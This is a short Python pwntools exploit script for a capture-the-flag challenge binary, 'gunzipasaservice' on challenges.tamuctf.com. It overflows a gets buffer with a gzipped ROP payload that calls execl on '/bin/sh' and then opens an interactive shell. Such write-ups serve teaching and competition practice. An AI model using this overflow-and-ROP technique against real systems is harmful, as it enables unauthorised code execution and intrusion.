from pwn import *
import sys
import os

context.clear(os='linux')

argv = sys.argv
binary_path = './gunzipasaservice'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('challenges.tamuctf.com', 4709)
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* execve+18
		''')

e = ELF(binary_path)


# ------------- plan -----------
# overflow using gets
# use rop and jump to execl with /bin/sh

overflow_offset = 1048
binsh_address = next(e.search('/bin/sh\x00'))

log.info('binsh address: {}'.format(hex(binsh_address)))

rop = ROP(e)
rop.execl(binsh_address, 0, 0)

payload = fit({
	overflow_offset: str(rop)
	})

# create regular file
with open('bloop', 'wb') as f:
	f.write(payload)

# gzip the file
os.system("gzip -c bloop > payload.gz")

# read the gz file
with open("payload.gz" , 'rb') as f:
	payload = f.read()

sh.send(payload)

os.system('rm bloop payload.gz')

sh.interactive()



